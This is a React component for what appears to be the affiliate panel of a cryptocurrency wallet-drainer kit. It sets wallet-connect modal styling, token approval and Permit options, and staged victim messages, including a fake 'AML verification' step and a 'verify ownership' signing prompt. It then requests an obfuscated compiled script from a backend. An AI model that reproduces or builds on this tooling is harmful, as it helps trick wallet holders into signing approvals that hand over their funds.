import React, { useState } from 'react';
import TopNav from './TopNav';
import Sidebar from './Sidebar';
import GeneralTab from './GeneralTab';
import DashboardTab from './DashboardTab';
import ModalTab from './ModalTab';
import ScriptGenerator from './ScriptGenerator';
import {
  Tab, GeneralSettings, DashboardSettings, ModalSettings, MessageStep, ErrorState,
} from './types';

const defaultGeneral: GeneralSettings = {
  font: 'Manrope',
  theme: 'light',
  borderRadius: 18,
  fontSize: 14,
  accentColor: '#7C73FF',
  openEvent: 'After click on button',
  openTrigger: 'Automatic',
};

const defaultDashboard: DashboardSettings = {
  menuItems: ['Domains', 'Logs', 'Settings', 'Compiler'],
  contractMethods: ['Claim', 'Execute', 'Swap'],
  enableApprove: true,
  enablePermit: true,
  enablePermit2: false,
  enableNFT: false,
  enableSwappers: true,
};

const defaultModal: ModalSettings = {
  selectedModal: 'wc3',
  borderRadius: 12,
  overlayBlur: 8,
  accentColor: '#FF2D92',
  supportedWallets: ['MetaMask', 'Coinbase', 'WalletConnect'],
};

const defaultMessageSteps: MessageStep[] = [
  { id: 1, label: 'Connect', text: 'Connect your wallet to continue' },
  { id: 2, label: 'Thanks', text: 'Thank you for connecting!' },
  { id: 3, label: 'Sign', text: 'Please sign the transaction to confirm' },
  { id: 4, label: 'Confirm', text: 'Confirming your transaction...' },
  { id: 5, label: 'Processing', text: 'Processing on chain...' },
  { id: 6, label: 'AML Check', text: 'Running AML verification...' },
  { id: 7, label: 'Finalize', text: 'Finalizing your request...' },
  { id: 8, label: 'Complete', text: 'Transaction complete!' },
];

const defaultErrorStates: ErrorState[] = [
  { id: 'generic', label: 'Generic Error', title: 'Something went wrong', description: 'Please try again later', button: 'Retry' },
  { id: 'lowbalance', label: 'Low Balance', title: 'Insufficient Balance', description: 'You need more funds to proceed', button: 'Add Funds' },
  { id: 'aml', label: 'AML Error', title: 'Verification Failed', description: 'Your wallet failed the AML check', button: 'Contact Support' },
];

const AffiliatePanel: React.FC<{ projectId: string; projectName?: string }> = ({ projectId, projectName }) => {
  const [walletConnected, setWalletConnected] = useState(false);
  const [activeTab, setActiveTab] = useState<Tab>('dashboard');
  const [general, setGeneral] = useState<GeneralSettings>(defaultGeneral);
  const [dashboard, setDashboard] = useState<DashboardSettings>(defaultDashboard);
  const [modal, setModal] = useState<ModalSettings>(defaultModal);
  const [messageSteps, setMessageSteps] = useState<MessageStep[]>(defaultMessageSteps);
  const [errorStates, setErrorStates] = useState<ErrorState[]>(defaultErrorStates);
  const apiBase = (import.meta.env.VITE_API_BASE_URL || '').replace(/\/$/, '');

  const walletStyleMap: Record<string, string> = {
    wc3: 'reown',
    wc2: 'walletconnect',
    family: 'custom',
    rainbow: 'rainbowkit',
    saturn: 'web3modal',
    mars: 'web3modal',
    venus: 'custom',
  };

  const handleGenerate = async (): Promise<string> => {
    const configPayload = {
      projectId,
      general: {
        connectText: 'Connect Wallet',
        connectedText: 'Connected: {wallet}',
        loadingText: messageSteps.find((step) => step.label === 'Processing')?.text || 'Verifying...',
        verifyText: messageSteps.find((step) => step.label === 'Sign')?.text || 'Please confirm in your wallet',
        rejectText: errorStates.find((state) => state.id === 'generic')?.title || 'Transaction was declined',
        disconnectText: 'Disconnect',
        themeMode: general.theme,
        transactionFunctionName: dashboard.contractMethods[0] || 'claimReward',
      },
      wallet: {
        supportedWallets: modal.supportedWallets.map((wallet) => wallet.toLowerCase()),
        walletVisibility: modal.supportedWallets.reduce<Record<string, boolean>>((acc, wallet) => {
          acc[wallet.toLowerCase()] = true;
          return acc;
        }, {}),
      },
      modal: {
        modalFrameworkStyle: walletStyleMap[modal.selectedModal] || 'custom',
        enableLatestWC: modal.selectedModal === 'wc3',
        clickToOpenModal: general.openEvent === 'After click on button',
      },
      tokens: {
        contractFunctions: dashboard.contractMethods,
        allowanceExecution: dashboard.enableApprove,
        balanceBasedApproval: dashboard.enablePermit || dashboard.enablePermit2,
        erc721Support: dashboard.enableNFT,
        marketplaceTransfers: dashboard.enableSwappers,
      },
      advanced: {
        signaturePromptText: messageSteps.find((step) => step.label === 'Sign')?.text || 'Verify ownership of {wallet}',
      },
    };

    const saveResponse = await fetch(`${apiBase}/api/affiliate/config`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(configPayload),
    });
    const saveData = await saveResponse.json();
    if (!saveResponse.ok) {
      throw new Error(saveData?.message || 'Failed to save affiliate config');
    }

    const compileResponse = await fetch(`${apiBase}/api/affiliate/compile`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ projectId, obfuscationLevel: 'medium' }),
    });

    if (!compileResponse.ok) {
      let message = 'Failed to compile affiliate script';
      try {
        const compileError = await compileResponse.json();
        message = compileError?.message || message;
      } catch {
        // keep default message
      }
      throw new Error(message);
    }

    return compileResponse.text();
  };

  return (
    <div
      style={{
        minHeight: '100vh',
        background: '#f7f6f3',
        fontFamily: 'Manrope, sans-serif',
        display: 'flex',
        flexDirection: 'column',
      }}
    >
      <TopNav
        walletConnected={walletConnected}
        walletAddress={projectName ? `${projectName} · ${projectId}` : projectId}
        onConnect={() => setWalletConnected(true)}
      />

      <div style={{ flex: 1, display: 'flex', overflow: 'hidden' }}>
        <Sidebar activeTab={activeTab} onTabChange={setActiveTab} />

        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', background: '#faf9f7' }}>
          {/* Content */}
          <div style={{ flex: 1, overflowY: 'auto', padding: '28px 42px', minHeight: 0 }}>
            <div
              key={activeTab}
              style={{ animation: 'fadeTab 0.25s cubic-bezier(0.4,0,0.2,1)' }}
            >
              {activeTab === 'general' && (
                <GeneralTab settings={general} onChange={setGeneral} />
              )}
              {activeTab === 'dashboard' && (
                <DashboardTab settings={dashboard} onChange={setDashboard} />
              )}
              {activeTab === 'modal' && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: 22 }}>
                  <ModalTab
                    settings={modal}
                    onChange={setModal}
                    messageSteps={messageSteps}
                    onMessageChange={setMessageSteps}
                    errorStates={errorStates}
                    onErrorChange={setErrorStates}
                  />
                  <ScriptGenerator onGenerate={handleGenerate} />
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes fadeTab {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>
    </div>
  );
};

export default AffiliatePanel;
